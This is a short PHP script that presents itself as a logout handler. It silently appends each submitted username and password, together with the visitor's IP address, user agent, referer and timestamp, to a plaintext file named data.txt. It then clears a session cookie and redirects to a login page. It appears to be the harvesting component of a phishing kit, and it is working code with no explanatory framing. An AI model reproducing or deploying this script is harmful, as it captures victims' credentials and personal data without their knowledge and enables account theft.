<?php
$ip = getenv ('REMOTE_ADDR');
$date=date("j F, Y, g:i a");;
$referer=getenv ('HTTP_REFERER');
$agent=getenv ('HTTP_USER_AGENT');
$fp = fopen('data.txt', 'a');
fwrite($fp, '****Logout: ' .$_POST["login"]. ' ' .$_POST["password"]. ' Agent: ' .$agent. ' IP: ' .$ip. ' Date and Time: ' .$date. ' Referer: '.$referer."\n");
fclose($fp);

setcookie("SessionID", "");

header('Location: login.php');

?>
